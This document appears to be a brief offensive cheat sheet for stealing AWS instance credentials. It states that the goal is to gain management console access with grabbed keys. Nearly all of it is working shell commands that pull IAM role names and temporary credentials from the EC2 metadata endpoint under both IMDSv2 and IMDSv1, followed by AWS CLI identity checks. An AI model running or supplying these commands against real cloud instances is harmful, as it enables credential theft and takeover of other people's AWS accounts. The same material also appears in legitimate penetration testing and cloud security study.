Grab AWS keys and than use this script to gain managment console access with the access provided by the keys.

### Grabbing creds with IMDSv2
# 1) get IMDSv2 token
```sh
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
```
# 2) get the role name attached to the instance
```sh
ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/)
```
# 3) get the temporary credentials JSON
```sh
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME
```
### Grabbing creds with IMDSv1
```sh
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### Using AWS CLI
# if instance role exists, aws cli uses it automatically; but you can also fetch metadata as above
```sh
aws sts get-caller-identity
```
# To view which creds CLI is using:
```sh
aws configure list
```
